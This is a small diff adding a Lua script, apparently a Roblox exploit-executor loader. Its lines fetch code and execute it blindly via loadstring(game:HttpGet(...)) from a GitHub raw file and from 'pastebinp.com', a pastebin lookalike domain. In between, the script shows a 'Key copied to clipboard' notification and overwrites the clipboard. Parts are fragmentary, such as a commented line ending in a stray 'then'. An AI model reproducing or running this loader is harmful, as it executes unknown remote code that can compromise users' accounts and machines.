@@ -1,0 +1,7 @@
+	loadstring(game:HttpGet"https://raw.githubusercontent.com/thedragonslayer2/hey/main/Misc./iris%20notification%20function")()
+-- IrisNotificationUserMrJack then IrisNotificationUserMrJack.ClearAllNotifications() end
+IrisNotificationMrJack(1, "Key copied to clipboard", "Key", 9e9)
+   wait(3)
+  IrisNotificationMrJack:Destroy()
+  loadstring(game:HttpGet"https://pastebinp.com/raw/eccv9pgu")()
+     setclipboard('98234q7ysdfa')
